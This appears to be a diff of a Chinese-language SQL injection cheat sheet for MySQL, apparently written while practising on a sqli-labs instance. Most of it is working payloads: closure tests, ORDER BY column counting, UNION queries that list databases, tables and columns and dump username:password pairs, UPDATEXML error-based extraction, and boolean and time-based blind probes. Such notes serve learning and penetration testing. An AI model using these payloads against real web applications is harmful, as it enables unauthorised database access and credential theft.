@@ -12,7 +12,7 @@ Cookie: uid=payload
 
 > 有时 SQLi 需要末尾添加注释符 `-- ` 才能执行, 其中仅用于 MySQL 有另一个注释符 `#` ;
 >
-> 注意添加注释时需要闭合 `''` , `""` 和 `()` ; 注意语法要符合 `Types` .
+> 需要闭合 `''` , `""` 和 `()` ; 注意语法要符合 `Types` .
 
 > 在 Burp 中测试必须将特殊符号进行 URL 编码.
 
@@ -27,6 +27,7 @@ Cookie: uid=payload
 传入特殊字符触发报错, 添加注释符后正常
 
 ```
+ 
 '
 "
 )
@@ -47,24 +48,36 @@ Cookie: uid=payload
 
 使用恒等条件判断, 若为 `true` 则返回数据, 若为 `false` 则没有数据
 
-> 亦可作为常见的闭合方式示例
+> 可用于判断闭合方式
 
 ```
- OR 1=1        # true
- AND 1=2       # false
-) OR )1=1      # true
-) AND )1=2     # false
-' OR '1'='1    # true
-' AND '1'='2   # false
-') OR ('1'='1  # true
-') AND ('1'='2 # false
-" OR "1"="1    # true
-" AND "1"="2   # false
-") OR ("1"="1  # true
-") AND ("1"="2 # false
+ OR 1=1      # true
+ AND 1=2     # false
+ OR 1=1 --   # true
+ AND 1=2 --  # false
+' OR 1=1      # true
+' AND 1=2     # false
+' OR 1=1 --   # true
+' AND 1=2 --  # false
+" OR 1=1      # true
+" AND 1=2     # false
+" OR 1=1 --   # true
+" AND 1=2 --  # false
+) OR 1=1      # true
+) AND 1=2     # false
+) OR 1=1 --   # true
+) AND 1=2 --  # false
+') OR 1=1      # true
+') AND 1=2     # false
+') OR 1=1 --   # true
+') AND 1=2 --  # false
+") OR 1=1      # true
+") AND 1=2     # false
+") OR 1=1 --   # true
+") AND 1=2 --  # false
 ```
 
-> 注意添加注释符时需要闭合 `''` 和 `""` 
+> 注意添加注释符时需要闭合 `''` , `""` 和 `()` 
 
 可通过 Merging characters 来 Bypass
 
@@ -120,85 +133,68 @@ Cookie: uid=payload
 
 ## 4. Types
 
-仅代表 SQLi 参数类型, 与闭合方式无关.
+### 4.1. SELECT
 
-### 4.1. Number
-
-```
-SELECT * FROM sec WHERE id = 1
-```
+基于 SELECT 的 SQL 语句
 
 ```
-?id=1\
-?id=1         # success
-?id=x         # error
-?id=1 OR 1=1  # true
-?id=1 AND 1=2 # false
-?id=1/1       # true
-?id=1/0       # false
-```
-
-### 4.2. String
-
-```
-SELECT * FROM sec WHERE id = '1'
-SELECT * FROM sec WHERE id = "1"
+SELECT * FROM users WHERE id = 1;
+SELECT * FROM users WHERE id = '1';
+SELECT * FROM users WHERE id = "1";
+SELECT * FROM users WHERE id = (1);
+SELECT * FROM users WHERE id = ('1');
+SELECT * FROM users WHERE id = ("1");
+SELECT * FROM users WHERE id = '%1%';
+SELECT * FROM users WHERE id = "%1%";
 ```
 
 ```
-?id=1\
-?id=1'             # error
-?id=1"             # error
-?id=1' OR '1'='1   # true
-?id=1" OR "1"="1   # true
-?id=1" AND '1'='2  # false
-?id=1" AND "1"="2  # false
+?id=1\  # error
+?id=1'  # error
+?id=1"  # error
+?id=1)  # error
+?id=1') # error
+?id=1") # error
+?id=1 OR 1=1      # true
+?id=1 AND 1=2     # false
+?id=1 OR 1=1 --   # true
+?id=1 AND 1=2 --  # false
+?id=1' OR 1=1      # true
+?id=1' AND 1=2     # false
+?id=1' OR 1=1 --   # true
+?id=1' AND 1=2 --  # false
+?id=1" OR 1=1      # true
+?id=1" AND 1=2     # false
+?id=1" OR 1=1 --   # true
+?id=1" AND 1=2 --  # false
+?id=1) OR 1=1      # true
+?id=1) AND 1=2     # false
+?id=1) OR 1=1 --   # true
+?id=1) AND 1=2 --  # false
+?id=1') OR 1=1      # true
+?id=1') AND 1=2     # false
+?id=1') OR 1=1 --   # true
+?id=1') AND 1=2 --  # false
+?id=1") OR 1=1      # true
+?id=1") AND 1=2     # false
+?id=1") OR 1=1 --   # true
+?id=1") AND 1=2 --  # false
 ```
 
-### 4.3. LIKE
+### 4.2.  INSERT/UPDATE
+
+基于 INSERT 或 UPDATE 的 SQL 语句
 
 ```
-SELECT * FROM sec WHERE id LIKE '%1%'
-```
-
-```
-?id=1              # 多个结果
-?id=%1%            # 多个结果
-?id=1% OR 1=1      # 多个结果
-?id=1%' OR '1'='1  # 多个结果
-?id=1%" OR "1"="1  # 多个结果
-?id=%'%            # error
-?id=%"%            # error
-```
-
-### 4.4. JSON
-
-```
-{
-    "id":"1"
-}
+INSERT INTO users (uname) VALUES ('1');
+INSERT INTO users (uname) VALUES ("1");
+UPDATE users SET uname = '1' WHERE id = 1;
+UPDATE users SET uname = "1" WHERE id = 1;
 ```
 
 ```
-{
-  "id": "1' OR '1'='1"  # true
-}
-
-{
-  "id": "1' AND '1'='2" # false
-}
-
-{
-  "id": "' UNION SELECT NULL, VERSION()"
-}
-
-{
-  "id": "1' AND SLEEP(5)"
-}
-
-{
-  "id": "1' AND LENGTH(DATABASE())>0"
-}
+' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR ' # error
+" OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR " # error
 ```
 
 ## 5. Column count
@@ -206,43 +202,39 @@ SELECT * FROM sec WHERE id LIKE '%1%'
 利用 ORDER BY 判断有几个字段
 
 ```
-?id=1 ORDER BY 4
+?id=1' ORDER BY 4 -- 
 ```
 
 > 当写入使用第 4 个字段排序时报错，说明后台查询有 3 个字段;
 >
 > 可尝试二分法.
 
-## 6. UNION
+## 6. SELECT
 
-示例
-
-```
-SELECT id, username, password FROM users WHERE id = '$id'
-```
-
-> 使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果
+使用 `UNION` 时推荐查询 `NULL` 以显示 `UNION` 的查询结果
 
 ### 6.1. Location
 
-查询字段必须与 `Column` 相同
+判断回显的位置
 
 ```
-?id=NULL UNION SELECT 1,2,3
+?id=NULL' UNION SELECT 1, 2, 3 -- 
 ```
+
+> 查询字段必须与 `Column` 相同
 
 ### 6.2. Database
 
 在有回显的位置显示所有数据库名
 
 ```
-?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables)
+?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables) -- 
 ```
 
 在有回显的位置显示当前数据库名
 
 ```
-?id=NULL UNION SELECT 1,2,DATABASE()
+?id=NULL' UNION SELECT 1, 2, DATABASE() -- 
 ```
 
 亦可查询以下内容
@@ -260,13 +252,13 @@ SELECT id, username, password FROM users WHERE id = '$id'
 获取指定数据库的所有数据表名
 
 ```
-?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security')
+?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security') -- 
 ```
 
 获取当前数据库的所有数据表名
 
 ```
-?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())
+?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()) -- 
 ```
 
 ### 6.4. Columns
@@ -274,13 +266,13 @@ SELECT id, username, password FROM users WHERE id = '$id'
 获取指定数据库中指定数据表的所有字段名
 
 ```
-?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users')
+?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users') -- 
 ```
 
 获取当前数据库中指定数据表的所有字段名
 
 ```
-?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users')
+?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users') -- 
 ```
 
 ### 6.5. Dump
@@ -288,22 +280,96 @@ SELECT id, username, password FROM users WHERE id = '$id'
 获取指定数据库中指定数据表中的所有数据
 
 ```
-?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,':',password) from security.users)
+?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users) -- 
 ```
 
 获取当前数据库中指定数据表中的所有数据
 
 ```
-?id=NULL UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,':',password) from users)
+?id=NULL' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users) -- 
 ```
 
-## 7. Blind
+## 7. INSERT/UPDATE
 
-### 7.1. Bool
+### 7.1. Location
+
+判断是否有回显
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, USER(), 0x7e), 1) OR '
+```
+
+### 7.2. Database
+
+显示所有数据库名
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(DISTINCT table_schema) FROM information_schema.tables), 0x7e), 1) OR '
+```
+
+显示当前数据库名
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, DATABASE(), 0x7e), 1) OR '
+```
+
+亦可查询以下内容
+
+| 操作                 | 描述         |
+| -------------------- | ------------ |
+| VERSION()            | MySQL 版本   |
+| USER()               | 数据库用户名 |
+| DATABASE()           | 数据库名     |
+| @@DATADIR            | 数据库路径   |
+| @@VERSION_COMPILE_OS | 系统版本     |
+
+### 7.3. Tables
+
+获取指定数据库的所有数据表名
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'), 0x7e), 1) OR '
+```
+
+获取当前数据库的所有数据表名
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()), 0x7e), 1) OR '
+```
+
+### 7.4. Columns
+
+获取指定数据库中指定数据表的所有字段名
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'), 0x7e), 1) OR '
+```
+
+获取当前数据库中指定数据表的所有字段名
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'), 0x7e), 1) OR '
+```
+
+### 7.5. Dump
+
+获取指定数据库中指定数据表中的所有数据
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM security.users), 0x7e), 1) OR '
+```
+
+获取当前数据库中指定数据表中的所有数据
+
+```
+' OR UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, 0x3A, password) FROM users), 0x7e), 1) OR '
+```
+
+## 8. Bool
 
 当没有回显时，可以根据反馈信息的真假进行注入
 
-### 7.1.1. 爆库
+### 8.1. 爆库
 
 判断数据库长度
 
@@ -359,7 +425,7 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(left(database(),3)) > 100 
 http://192.168.1.76/sqli-labs/Less-1/?id=1' and ascii(right(database(),3)) > 100 --+
 ```
 
-### 7.1.2. 爆表
+### 8.2. 爆表
 
 判断数据表的个数
 
@@ -379,7 +445,7 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from informatio
 ?id=1' and （select length(table_name）from information_schema.tables where table_schema=database() limit 0,1)=1 --+
 ```
 
-### 7.1.3. 爆字段
+### 8.3. 爆字段
 
 判断字段的个数
 
@@ -393,15 +459,15 @@ http://192.168.1.76/sqli-labs/Less-1/?id=1' and (select count(*) from informatio
 
 > 在 `mysql 5.7` 中新增了 `sys.schema` 基础数据来自于 `performance_chema` 和 `information_schema` 两个库，本身数据库不存储数据
 
-### 7.1.4. 拖库
+### 8.4. 拖库
 
-### 7.2. Time
+## 9. Time
 
 当反馈信息没有区别时，可以根据响应时间进行注入
 
 > http://192.168.1.76/sqli-labs/Less-8/
 
-### 7.2.1. 判断是否存在 SQL 注入
+### 9.1. 判断是否存在 SQL 注入
 
 尝试传递特殊字符 `` `
 
@@ -419,7 +485,7 @@ http://192.168.1.76/sqli-labs/Less-8/?id=1'
 http://192.168.1.76/sqli-labs/Less-8/?id=1' --+
 ```
 
-### 7.2.2. 爆库
+### 9.2. 爆库
 
 判断数据库长度
 
